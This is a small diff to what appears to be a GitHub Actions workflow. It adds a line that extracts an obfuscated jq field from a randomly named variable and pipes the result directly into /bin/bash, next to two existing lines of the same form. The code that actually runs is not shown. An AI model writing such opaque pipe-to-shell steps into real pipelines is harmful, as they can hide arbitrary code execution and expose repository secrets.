@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$tb25665" | jq -r .fcnd516 | /bin/bash
           printf '%s' "$d6" | jq -r .ihu101 | /bin/bash
+          printf '%s' "$tn917" | jq -r .lhq4 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
